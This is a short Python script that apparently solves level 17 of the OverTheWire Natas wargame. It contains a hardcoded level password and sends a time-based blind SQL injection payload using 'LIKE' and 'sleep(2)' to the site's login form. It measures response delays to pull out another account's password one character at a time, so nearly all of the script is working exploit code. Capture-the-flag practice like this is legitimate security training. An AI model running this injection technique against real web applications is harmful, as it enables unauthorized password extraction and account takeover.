import requests
import re
import string
from time import *

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

print(characters)

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

seen_password = ""

while len(seen_password) < len(password):
	for ch in characters:
		
		print("trying with " + seen_password + ch)
		start_time = time()
		response = session.post(url, data= {"username": 'natas18 "AND BINARY password LIKE "'+ seen_password + ch +'%" and sleep(2)#'}, auth = (username, password))
		end_time = time()
		content = response.text
		difference = end_time - start_time
		
		if difference>1:
			seen_password+=ch
			break
		
print(seen_password)

